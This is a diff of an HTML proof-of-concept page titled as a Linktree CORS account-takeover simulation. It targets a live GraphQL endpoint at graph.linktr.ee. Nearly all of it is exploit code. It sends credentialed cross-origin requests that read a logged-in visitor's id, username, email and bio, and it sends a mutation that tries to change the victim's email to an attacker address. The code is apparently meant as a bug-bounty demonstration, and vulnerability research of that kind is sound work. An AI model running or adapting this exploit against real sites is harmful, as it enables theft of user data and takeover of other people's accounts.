@@ -1,64 +1,92 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Authenticated CORS – Session Proof</title>
-<style>
-body { background:#0d1117; color:#c9d1d9; font-family: monospace; padding:40px }
-pre { background:#161b22; padding:20px; border:1px solid #30363d }
-button { padding:10px 20px; font-weight:bold }
-</style>
+  <meta charset="UTF-8">
+  <title>Linktree CORS Misconfig - Full Account Takeover Simulation</title>
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; text-align: center; }
+    .container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; display: inline-block; min-width: 600px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+    h1 { color: #ff4d4d; font-size: 24px; }
+    button { background-color: #ff3333; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; margin-top: 20px; }
+    button:hover { background-color: #cc0000; }
+    #output { margin-top: 25px; text-align: left; background: #0d1117; padding: 20px; border-radius: 6px; border: 1px solid #30363d; color: #7ee787; white-space: pre-wrap; font-family: monospace; overflow-x: auto; max-height: 300px; }
+  </style>
 </head>
 <body>
 
-<h2>Linktree Authenticated CORS – Session Validation</h2>
+<div class="container">
+  <h1>🚨 CORS Misconfig – Simulated Account Access</h1>
+  <p><strong>Target:</strong> graph.linktr.ee/graphql</p>
+  <p>This demo simulates what happens if sensitive resolvers are added or already exist.</p>
 
-<button onclick="run()">Run Test</button>
+  <button onclick="fetchUserData()">FETCH USER DATA</button>
+  <button onclick="attemptChangeEmail()">ATTEMPT EMAIL CHANGE</button>
 
-<pre id="out">Waiting…</pre>
+  <div id="output">Status: Waiting...</div>
+</div>
 
 <script>
-async function run() {
-  const out = document.getElementById("out");
-  out.textContent = "[*] Sending authenticated cross-origin request…";
-
-  /*
-   IMPORTANT:
-   Replace THIS query with ANY user-bound query you know is valid.
-   Examples (depends on schema):
-   - viewer { id username }
-   - me { email }
-   - account { isPro }
-  */
-
-  const query = `
-    query {
-      viewer {
-        id
-        username
-      }
+  async function sendGraphQLQuery(query) {
+    const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
+    try {
+      const res = await fetch(url, {
+        method: 'GET',
+        credentials: 'include'
+      });
+      return await res.json();
+    } catch (err) {
+      console.error(err);
+      return { error: err.message };
     }
-  `;
-
-  const url = "https://graph.linktr.ee/graphql?query=" + encodeURIComponent(query);
-
-  try {
-    const r = await fetch(url, {
-      credentials: "include"
-    });
-
-    const data = await r.json();
-
-    out.textContent =
-      "[+] Response received via cross-origin authenticated fetch\n\n" +
-      JSON.stringify(data, null, 2) +
-      "\n\n[!] If this output changes per logged-in user, session privacy is broken.";
-
-  } catch (e) {
-    out.textContent = "[-] Error: " + e.message;
   }
-}
-</script>
 
+  async function fetchUserData() {
+    const out = document.getElementById("output");
+    out.innerHTML = "[*] Fetching current user's data...";
+
+    const query = `
+      query {
+        viewer {
+          id
+          username
+          email
+          bio
+          profilePictureUrl
+        }
+      }
+    `;
+
+    const result = await sendGraphQLQuery(query);
+
+    if (result?.data?.viewer) {
+      out.innerHTML = `<span style='color:#7ee787;'>✅ SUCCESSFUL DATA ACCESS:</span>\n${JSON.stringify(result.data.viewer, null, 2)}`;
+    } else {
+      out.innerHTML = `<span style='color:#ffa657;'>⚠️ NO SENSITIVE DATA FOUND YET</span>\nBut the endpoint allows any query!\n\nResponse:\n${JSON.stringify(result, null, 2)}`;
+    }
+  }
+
+  async function attemptChangeEmail() {
+    const out = document.getElementById("output");
+    out.innerHTML = "[*] Trying to change user's email address...";
+
+    // Example mutation (may fail unless endpoint accepts mutations over GET)
+    const mutation = `
+      mutation {
+        updateUser(input: {email: "attacker@example.com"}) {
+          success
+          message
+        }
+      }
+    `;
+
+    const result = await sendGraphQLQuery(mutation);
+
+    if (result?.data?.updateUser?.success) {
+      out.innerHTML = `<span style='color:#7ee787;'>✅ EMAIL CHANGED SUCCESSFULLY!</span>`;
+    } else {
+      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Mutation failed or blocked:</span>\n${JSON.stringify(result, null, 2)}`;
+    }
+  }
+</script>
 </body>
 </html>
